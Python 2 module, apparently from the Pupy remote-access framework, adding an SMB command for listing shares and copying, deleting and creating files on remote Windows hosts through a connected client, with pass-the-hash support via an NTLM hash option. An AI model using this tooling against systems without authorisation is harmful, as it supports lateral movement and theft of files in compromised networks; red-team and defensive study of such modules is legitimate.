# -*- coding: utf-8 -*-
from pupylib.PupyModule import *
import os
import ntpath
from pupylib.utils.rpyc_utils import obtain

__class_name__="SMB"

@config(cat="admin")
class SMB(PupyModule):
    ''' Copy files via SMB protocol '''

    max_clients = 1
    dependencies = [ 'impacket', 'pupyutils.psexec' ]

    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog='smbcp', description=self.__doc__)
        self.arg_parser.add_argument('-u', '--username', default='', help='Username')
        self.arg_parser.add_argument('-P', '--port', default=445, type=int, help='Port')
        self.arg_parser.add_argument('-p', '--password', default='', help='Password')
        self.arg_parser.add_argument('-d', '--domain', default='', help='Domain')
        self.arg_parser.add_argument('-H', '--hash', default='', help='NTLM hash')
        self.arg_parser.add_argument('-T', '--timeout', default=30, type=int, help='Timeout')
        self.arg_parser.add_argument('-c', '--codepage', default=None, help='Codepage')

        commands = self.arg_parser.add_subparsers(dest="command")
        cp = commands.add_parser('cp')
        cp.add_argument('src', help='Source')
        cp.add_argument('dst', help='Destination')
        cp.set_defaults(func=self.cp)

        ls = commands.add_parser('ls')
        ls.add_argument('dst', help='Destination')
        ls.set_defaults(func=self.ls)

        rm = commands.add_parser('rm')
        rm.add_argument('dst', help='Destination')
        rm.set_defaults(func=self.rm)

        mkdir = commands.add_parser('mkdir')
        mkdir.add_argument('dst', help='Destination')
        mkdir.set_defaults(func=self.mkdir)

        rmdir = commands.add_parser('rmdir')
        rmdir.add_argument('dst', help='Destination')
        rmdir.set_defaults(func=self.rmdir)

        shares = commands.add_parser('shares')
        shares.add_argument('host', help='Host')
        shares.set_defaults(func=self.shares)

    def run(self, args):
        args.func(args)

    def get_ft(self, args, host):
        return self.client.conn.modules['pupyutils.psexec'].FileTransfer(
            host,
            port=args.port, hash=args.hash,
            username=args.username, password=args.password, domain=args.domain,
            timeout=args.timeout
        )

    def shares(self, args):
        host = args.host
        host = host.replace('\\', '//')
        if host.startswith('//'):
            host = host[2:]
        ft = self.get_ft(args, host)
        if not ft.ok:
            self.error(ft.error)
            return

        for share in obtain(ft.shares()):
            self.log(share)

        if not ft.ok:
            self.error(ft.error)

    def parse_netloc(self, line, partial=False, codepage=None):
        line = line.replace('\\', '/')
        if not line.startswith('//'):
            raise ValueError('Invalid network format')

        if not type(line) == unicode:
            line = line.decode('utf-8')

        if codepage:
            line = line.encode(codepage, errors='replace')

        remote = line[2:].split('/')

        if partial:
            if len(remote) == 0:
                raise ValueError('Empty network specification')

            if not (remote[0]):
                raise ValueError('Host is empty')

            host = remote[0]
            if len(remote) > 1:
                share = remote[1]
            else:
                share = ''

            if len(remote) > 2:
                path = ntpath.normpath('\\'.join(remote[2:]))
                if remote[-1] == '':
                    path += '\\'
            else:
                path = ''

            return host, share, path

        else:
            if len(remote) < 3 or not all(remote[:2]):
                raise ValueError('Invalid network format')

            return remote[0], remote[1], ntpath.normpath('\\'.join(remote[2:]))

    def ls(self, args):
        try:
            host, share, path = self.parse_netloc(args.dst, partial=True, codepage=args.codepage)
        except Exception, e:
            self.error(str(e))
            return

        if not share:
            args.host = host
            self.shares(args)
            return

        if not path or path == '.' or path.endswith('\\'):
            path += '*'

        ft = self.get_ft(args, host)
        if not ft.ok:
            self.error(ft.error)
            return

        for name, directory, size, ctime in obtain(ft.ls(share, path)):
            if args.codepage:
                name = name.encode('utf-16le').decode(args.codepage, errors='replace')

            self.log(u'%crw-rw-rw- %10d  %s %s' % ('d' if directory > 0 else '-', size, ctime, name))

        if not ft.ok:
            self.error(ft.error)

    def rm(self, args):
        try:
            host, share, path = self.parse_netloc(args.dst, codepage=args.codepage)
        except Exception, e:
            self.error(str(e))
            return

        ft = self.get_ft(args, host)
        if not ft.ok:
            self.error(ft.error)
            return

        ft.rm(share, path)
        if not ft.ok:
            self.error(ft.error)

    def mkdir(self, args):
        try:
            host, share, path = self.parse_netloc(args.dst, codepage=args.codepage)
        except Exception, e:
            self.error(str(e))
            return

        ft = self.get_ft(args, host)
        if not ft.ok:
            self.error(ft.error)
            return

        ft.mkdir(share, path)
        if not ft.ok:
            self.error(ft.error)

    def rmdir(self, args):
        try:
            host, share, path = self.parse_netloc(args.dst, codepage=args.codepage)
        except Exception, e:
            self.error(str(e))
            return

        ft = self.get_ft(args, host)
        if not ft.ok:
            self.error(ft.error)
            return

        ft.rmdir(share, path)
        if not ft.ok:
            self.error(ft.error)

    def cp(self, args):
        upload = False
        src = args.src.replace('\\', '/')
        dst = args.dst.replace('\\', '/')
        if dst.startswith('//'):
            upload = True
            remote = dst
            local = src
        elif src.startswith('//'):
            remote = src
            local = dst
        else:
            self.error('Either src or dst should be network share in (\\HOST\SHARE\PATH) format')
            return

        try:
            host, share, path = self.parse_netloc(remote, codepage=args.codepage)
        except Exception, e:
            self.error(e)
            return

        local = os.path.expandvars(local)
        local = os.path.expanduser(local)

        if upload and not os.path.isfile(local):
            self.error('Source file {} not found'.format(local))
            return

        ft = self.get_ft(args, host)

        if not ft.ok:
            self.error(ft.error)
            return

        interval, timeout = self.client.conn._conn.root.getconn().get_pings()
        self.client.conn._conn.root.getconn().set_pings(0, 0)

        if upload:
            with open(local, 'r+b') as source:
                ft.put(source.read, share, path)
        else:
            with open(local, 'w+b') as destination:
                ft.get(share, path, destination.write)

        self.client.conn._conn.root.getconn().set_pings(interval, timeout)

        if not ft.ok:
            self.error(ft.error)
